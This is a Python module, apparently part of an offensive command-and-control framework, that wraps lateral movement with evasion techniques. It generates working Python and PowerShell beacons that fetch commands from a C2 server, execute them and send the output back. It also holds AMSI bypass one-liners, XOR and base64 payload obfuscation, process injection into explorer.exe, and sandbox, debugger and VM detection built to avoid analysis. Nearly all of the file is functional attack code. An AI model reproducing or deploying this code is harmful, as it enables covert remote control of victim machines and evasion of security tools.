"""
Lateral Movement Evasion Layer
Integrates evasion techniques with lateral movement for stealthy beacon deployment
Uses reflective loader, process injection, and other EDR bypass techniques
"""

import os
import time
import base64
import random
import secrets
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

from cybermodules.helpers import log_to_intel

# Import evasion modules
try:
    from evasion.reflective_loader import ReflectiveLoader
    HAS_REFLECTIVE_LOADER = True
except ImportError:
    HAS_REFLECTIVE_LOADER = False

try:
    from evasion.process_injection import ProcessInjector
    HAS_PROCESS_INJECTION = True
except ImportError:
    HAS_PROCESS_INJECTION = False

try:
    from evasion.amsi_bypass import AMSIBypass
    HAS_AMSI_BYPASS = True
except ImportError:
    HAS_AMSI_BYPASS = False

try:
    from evasion.sleep_obfuscation import SleepObfuscation
    HAS_SLEEP_OBFUSCATION = True
except ImportError:
    HAS_SLEEP_OBFUSCATION = False


class EvasionProfile(Enum):
    """Predefined evasion profiles"""
    NONE = "none"                 # No evasion - fast but detectable
    DEFAULT = "default"           # Basic evasion
    STEALTH = "stealth"          # Moderate evasion
    PARANOID = "paranoid"        # Maximum evasion - slow but very stealthy
    AGGRESSIVE = "aggressive"    # Fast with some evasion


@dataclass
class EvasionConfig:
    """Evasion configuration for lateral movement"""
    profile: EvasionProfile = EvasionProfile.STEALTH
    
    # Reflective loading
    use_reflective_loader: bool = True
    reflective_technique: str = "module_stomping"  # module_stomping, transacted_hollowing
    
    # Process injection
    use_process_injection: bool = True
    injection_technique: str = "thread_hijacking"  # thread_hijacking, apc_injection, early_bird
    target_process: str = "explorer.exe"
    
    # AMSI/ETW bypass
    bypass_amsi: bool = True
    bypass_etw: bool = True
    unhook_ntdll: bool = True
    
    # Sleep/timing
    use_sleep_obfuscation: bool = True
    sleep_technique: str = "ekko"  # ekko, foliage, death_sleep
    jitter_percent: float = 0.3
    min_sleep_ms: int = 1000
    max_sleep_ms: int = 5000
    
    # Traffic obfuscation
    encrypt_traffic: bool = True
    encryption_key: str = ""
    use_domain_fronting: bool = False
    
    # Anti-analysis
    detect_sandbox: bool = True
    detect_debugger: bool = True
    check_vm: bool = True


class LateralEvasionLayer:
    """
    Evasion layer for lateral movement operations
    Wraps lateral movement with various evasion techniques
    """
    
    def __init__(self, scan_id: int = 0, config: EvasionConfig = None):
        self.scan_id = scan_id
        self.config = config or EvasionConfig()
        
        # Initialize evasion modules
        self.reflective_loader = None
        self.process_injector = None
        self.amsi_bypass = None
        self.sleep_obfuscator = None
        
        self._init_evasion_modules()
    
    def _init_evasion_modules(self):
        """Initialize available evasion modules"""
        
        if HAS_REFLECTIVE_LOADER and self.config.use_reflective_loader:
            try:
                self.reflective_loader = ReflectiveLoader()
                self._log("Reflective loader initialized")
            except Exception as e:
                self._log(f"Failed to init reflective loader: {e}")
        
        if HAS_PROCESS_INJECTION and self.config.use_process_injection:
            try:
                self.process_injector = ProcessInjector()
                self._log("Process injector initialized")
            except Exception as e:
                self._log(f"Failed to init process injector: {e}")
        
        if HAS_AMSI_BYPASS and self.config.bypass_amsi:
            try:
                self.amsi_bypass = AMSIBypass()
                self._log("AMSI bypass initialized")
            except Exception as e:
                self._log(f"Failed to init AMSI bypass: {e}")
        
        if HAS_SLEEP_OBFUSCATION and self.config.use_sleep_obfuscation:
            try:
                self.sleep_obfuscator = SleepObfuscation()
                self._log("Sleep obfuscation initialized")
            except Exception as e:
                self._log(f"Failed to init sleep obfuscation: {e}")
    
    def prepare_beacon_payload(self, beacon_type: str, beacon_config: Dict) -> bytes:
        """
        Prepare beacon payload with evasion techniques applied
        
        Args:
            beacon_type: Type of beacon (python, go, rust)
            beacon_config: Beacon configuration (c2_url, callback_interval, etc.)
        
        Returns:
            bytes: Evasion-wrapped beacon payload
        """
        
        self._log(f"Preparing {beacon_type} beacon with evasion profile: {self.config.profile.value}")
        
        # Generate base beacon
        beacon_code = self._generate_beacon(beacon_type, beacon_config)
        
        # Apply evasion based on profile
        if self.config.profile == EvasionProfile.NONE:
            return beacon_code
        
        # Stage 1: AMSI bypass (for PowerShell/C# beacons)
        if self.config.bypass_amsi:
            beacon_code = self._wrap_with_amsi_bypass(beacon_code, beacon_type)
        
        # Stage 2: Encrypt payload
        if self.config.encrypt_traffic:
            key = self.config.encryption_key or secrets.token_hex(16)
            beacon_code = self._encrypt_payload(beacon_code, key)
        
        # Stage 3: Generate reflective loader stub
        if self.config.use_reflective_loader and self.reflective_loader:
            beacon_code = self._wrap_with_reflective_loader(beacon_code)
        
        # Stage 4: Add anti-analysis checks
        if self.config.detect_sandbox or self.config.detect_debugger:
            beacon_code = self._add_anti_analysis(beacon_code, beacon_type)
        
        self._log(f"Beacon prepared: {len(beacon_code)} bytes")
        return beacon_code
    
    def prepare_lateral_command(self, command: str, target_os: str = "windows") -> str:
        """
        Prepare command for lateral movement with evasion
        
        Args:
            command: Command to execute
            target_os: Target operating system
        
        Returns:
            str: Evasion-wrapped command
        """
        
        if self.config.profile == EvasionProfile.NONE:
            return command
        
        wrapped_command = command
        
        # Windows-specific evasion
        if target_os == "windows":
            # Add AMSI bypass for PowerShell commands
            if "powershell" in command.lower() and self.config.bypass_amsi:
                amsi_bypass = self._get_amsi_bypass_oneliner()
                wrapped_command = f"{amsi_bypass}; {command}"
            
            # Obfuscate command
            if self.config.profile in [EvasionProfile.STEALTH, EvasionProfile.PARANOID]:
                wrapped_command = self._obfuscate_command(wrapped_command)
        
        return wrapped_command
    
    def inject_beacon(self, beacon_payload: bytes, target_process: str = None) -> Dict[str, Any]:
        """
        Inject beacon into target process using evasion techniques
        
        Args:
            beacon_payload: Beacon payload bytes
            target_process: Target process name (default from config)
        
        Returns:
            Dict with injection result
        """
        
        target = target_process or self.config.target_process
        technique = self.config.injection_technique
        
        self._log(f"Injecting beacon into {target} using {technique}")
        
        result = {
            'success': False,
            'technique': technique,
            'target_process': target,
            'pid': None,
            'error': None
        }
        
        if not self.process_injector:
            result['error'] = "Process injector not available"
            return result
        
        try:
            # Select injection technique based on profile
            if technique == "thread_hijacking":
                pid = self.process_injector.thread_execution_hijacking(
                    beacon_payload, target
                )
            elif technique == "apc_injection":
                pid = self.process_injector.queue_user_apc_injection(
                    beacon_payload, target
                )
            elif technique == "early_bird":
                pid = self.process_injector.early_bird_injection(
                    beacon_payload, target
                )
            else:
                # Default: basic injection
                pid = self.process_injector.inject(beacon_payload, target)
            
            if pid:
                result['success'] = True
                result['pid'] = pid
                self._log(f"Beacon injected successfully, PID: {pid}")
            else:
                result['error'] = "Injection returned no PID"
                
        except Exception as e:
            result['error'] = str(e)
            self._log(f"Injection failed: {e}")
        
        return result
    
    def evasive_sleep(self, base_duration_ms: int = None) -> int:
        """
        Sleep with obfuscation and jitter
        
        Args:
            base_duration_ms: Base sleep duration in milliseconds
        
        Returns:
            int: Actual sleep duration
        """
        
        if base_duration_ms is None:
            base_duration_ms = random.randint(
                self.config.min_sleep_ms,
                self.config.max_sleep_ms
            )
        
        # Apply jitter
        jitter = int(base_duration_ms * self.config.jitter_percent)
        actual_duration = base_duration_ms + random.randint(-jitter, jitter)
        actual_duration = max(100, actual_duration)  # Minimum 100ms
        
        if self.config.use_sleep_obfuscation and self.sleep_obfuscator:
            # Use obfuscated sleep
            technique = self.config.sleep_technique
            
            try:
                if technique == "ekko":
                    self.sleep_obfuscator.ekko_sleep(actual_duration)
                elif technique == "foliage":
                    self.sleep_obfuscator.foliage_sleep(actual_duration)
                elif technique == "death_sleep":
                    self.sleep_obfuscator.death_sleep(actual_duration)
                else:
                    time.sleep(actual_duration / 1000)
            except Exception:
                time.sleep(actual_duration / 1000)
        else:
            time.sleep(actual_duration / 1000)
        
        return actual_duration
    
    def check_environment(self) -> Dict[str, bool]:
        """
        Check environment for analysis indicators
        
        Returns:
            Dict with detection results
        """
        
        checks = {
            'sandbox_detected': False,
            'debugger_detected': False,
            'vm_detected': False,
            'safe_to_proceed': True
        }
        
        if not self.config.detect_sandbox and not self.config.detect_debugger:
            return checks
        
        # Sandbox detection
        if self.config.detect_sandbox:
            checks['sandbox_detected'] = self._detect_sandbox()
        
        # Debugger detection
        if self.config.detect_debugger:
            checks['debugger_detected'] = self._detect_debugger()
        
        # VM detection
        if self.config.check_vm:
            checks['vm_detected'] = self._detect_vm()
        
        # Determine if safe to proceed
        if self.config.profile == EvasionProfile.PARANOID:
            checks['safe_to_proceed'] = not any([
                checks['sandbox_detected'],
                checks['debugger_detected'],
                checks['vm_detected']
            ])
        elif self.config.profile == EvasionProfile.STEALTH:
            checks['safe_to_proceed'] = not any([
                checks['sandbox_detected'],
                checks['debugger_detected']
            ])
        
        return checks
    
    def _generate_beacon(self, beacon_type: str, config: Dict) -> bytes:
        """Generate beacon code based on type"""
        
        c2_url = config.get('c2_url', 'https://localhost:8443')
        interval = config.get('callback_interval', 60)
        jitter = config.get('jitter', 0.2)
        
        if beacon_type == "python":
            code = f'''
import time
import random
import requests
import platform
import subprocess

class Beacon:
    def __init__(self):
        self.c2 = "{c2_url}"
        self.interval = {interval}
        self.jitter = {jitter}
        self.id = "{secrets.token_hex(8)}"
    
    def callback(self):
        try:
            headers = {{"User-Agent": "Mozilla/5.0", "X-Beacon-ID": self.id}}
            r = requests.get(f"{{self.c2}}/beacon/{{self.id}}", headers=headers, timeout=30)
            if r.status_code == 200:
                cmd = r.json().get("command")
                if cmd:
                    out = subprocess.check_output(cmd, shell=True, timeout=60)
                    requests.post(f"{{self.c2}}/beacon/{{self.id}}/result", 
                                 json={{"output": out.decode()}}, headers=headers)
        except Exception:
            pass
    
    def run(self):
        while True:
            self.callback()
            sleep_time = self.interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(sleep_time)

if __name__ == "__main__":
    Beacon().run()
'''
            return code.encode()
        
        elif beacon_type == "powershell":
            code = f'''
$c2 = "{c2_url}"
$interval = {interval}
$id = "{secrets.token_hex(8)}"

while($true) {{
    try {{
        $r = Invoke-WebRequest -Uri "$c2/beacon/$id" -Headers @{{"X-Beacon-ID"=$id}} -UseBasicParsing
        if($r.StatusCode -eq 200) {{
            $cmd = ($r.Content | ConvertFrom-Json).command
            if($cmd) {{
                $out = Invoke-Expression $cmd 2>&1 | Out-String
                Invoke-WebRequest -Uri "$c2/beacon/$id/result" -Method POST -Body (@{{output=$out}} | ConvertTo-Json) -ContentType "application/json"
            }}
        }}
    }} catch {{}}
    Start-Sleep -Seconds ($interval + (Get-Random -Minimum (-$interval*{jitter}) -Maximum ($interval*{jitter})))
}}
'''
            return code.encode()
        
        else:
            # Generic shellcode placeholder
            return b"\x90" * 100  # NOP sled placeholder
    
    def _wrap_with_amsi_bypass(self, payload: bytes, beacon_type: str) -> bytes:
        """Wrap payload with AMSI bypass"""
        
        if beacon_type != "powershell":
            return payload
        
        amsi_bypass = b'''
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
'''
        return amsi_bypass + b"\n" + payload
    
    def _encrypt_payload(self, payload: bytes, key: str) -> bytes:
        """Encrypt payload with XOR"""
        key_bytes = key.encode()
        encrypted = bytearray()
        for i, byte in enumerate(payload):
            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
        
        # Return base64 encoded with decryption stub
        encoded = base64.b64encode(bytes(encrypted)).decode()
        return f"KEY={key};DATA={encoded}".encode()
    
    def _wrap_with_reflective_loader(self, payload: bytes) -> bytes:
        """Wrap payload with reflective loader stub"""
        
        if not self.reflective_loader:
            return payload
        
        try:
            return self.reflective_loader.wrap_payload(payload)
        except Exception:
            return payload
    
    def _add_anti_analysis(self, payload: bytes, beacon_type: str) -> bytes:
        """Add anti-analysis checks to payload"""
        
        anti_analysis = b'''
# Anti-analysis checks
import os, sys, time
def check_env():
    # Check for common sandbox indicators
    sandbox_indicators = ['sandbox', 'virus', 'malware', 'sample', 'test']
    username = os.environ.get('USERNAME', '').lower()
    if any(ind in username for ind in sandbox_indicators):
        sys.exit(0)
    # Check for debugger
    if sys.gettrace():
        sys.exit(0)
    # Check system uptime (sandboxes often have low uptime)
    try:
        import psutil
        if psutil.boot_time() > time.time() - 600:  # Less than 10 min
            time.sleep(660)  # Wait it out
    except:
        pass
    return True

if not check_env():
    sys.exit(0)

'''
        if beacon_type == "python":
            return anti_analysis + payload
        return payload
    
    def _get_amsi_bypass_oneliner(self) -> str:
        """Get AMSI bypass one-liner for command injection"""
        return "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
    
    def _obfuscate_command(self, command: str) -> str:
        """Basic command obfuscation"""
        # Simple base64 encoding for PowerShell
        if "powershell" in command.lower():
            encoded = base64.b64encode(command.encode('utf-16-le')).decode()
            return f"powershell -enc {encoded}"
        return command
    
    def _detect_sandbox(self) -> bool:
        """Detect sandbox environment"""
        import os
        
        indicators = [
            os.path.exists("/tmp/sandbox"),
            os.environ.get("SANDBOX", "") == "1",
            "sandbox" in os.environ.get("USERNAME", "").lower(),
        ]
        return any(indicators)
    
    def _detect_debugger(self) -> bool:
        """Detect debugger presence"""
        import sys
        return sys.gettrace() is not None
    
    def _detect_vm(self) -> bool:
        """Detect virtual machine"""
        import subprocess
        
        try:
            # Check for VM indicators in DMI
            output = subprocess.check_output(
                ["dmidecode", "-s", "system-manufacturer"],
                stderr=subprocess.DEVNULL,
                timeout=5
            ).decode().lower()
            
            vm_indicators = ["vmware", "virtualbox", "qemu", "xen", "hyper-v"]
            return any(ind in output for ind in vm_indicators)
        except Exception:
            return False
    
    def _log(self, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, "LATERAL_EVASION", message)
        print(f"[LATERAL_EVASION] {message}")


def get_evasion_config_for_profile(profile: str) -> EvasionConfig:
    """Get EvasionConfig for a named profile"""
    
    profile_enum = EvasionProfile(profile.lower())
    
    if profile_enum == EvasionProfile.NONE:
        return EvasionConfig(
            profile=EvasionProfile.NONE,
            use_reflective_loader=False,
            use_process_injection=False,
            bypass_amsi=False,
            bypass_etw=False,
            use_sleep_obfuscation=False,
            detect_sandbox=False,
            detect_debugger=False
        )
    
    elif profile_enum == EvasionProfile.DEFAULT:
        return EvasionConfig(
            profile=EvasionProfile.DEFAULT,
            use_reflective_loader=False,
            use_process_injection=True,
            injection_technique="apc_injection",
            bypass_amsi=True,
            bypass_etw=False,
            use_sleep_obfuscation=False
        )
    
    elif profile_enum == EvasionProfile.STEALTH:
        return EvasionConfig(
            profile=EvasionProfile.STEALTH,
            use_reflective_loader=True,
            reflective_technique="module_stomping",
            use_process_injection=True,
            injection_technique="thread_hijacking",
            target_process="explorer.exe",
            bypass_amsi=True,
            bypass_etw=True,
            use_sleep_obfuscation=True,
            sleep_technique="ekko",
            jitter_percent=0.3
        )
    
    elif profile_enum == EvasionProfile.PARANOID:
        return EvasionConfig(
            profile=EvasionProfile.PARANOID,
            use_reflective_loader=True,
            reflective_technique="transacted_hollowing",
            use_process_injection=True,
            injection_technique="early_bird",
            target_process="RuntimeBroker.exe",
            bypass_amsi=True,
            bypass_etw=True,
            unhook_ntdll=True,
            use_sleep_obfuscation=True,
            sleep_technique="death_sleep",
            jitter_percent=0.5,
            min_sleep_ms=5000,
            max_sleep_ms=30000,
            detect_sandbox=True,
            detect_debugger=True,
            check_vm=True
        )
    
    elif profile_enum == EvasionProfile.AGGRESSIVE:
        return EvasionConfig(
            profile=EvasionProfile.AGGRESSIVE,
            use_reflective_loader=True,
            use_process_injection=True,
            injection_technique="apc_injection",
            bypass_amsi=True,
            use_sleep_obfuscation=False,
            min_sleep_ms=500,
            max_sleep_ms=2000,
            detect_sandbox=False,
            detect_debugger=False
        )
    
    return EvasionConfig()
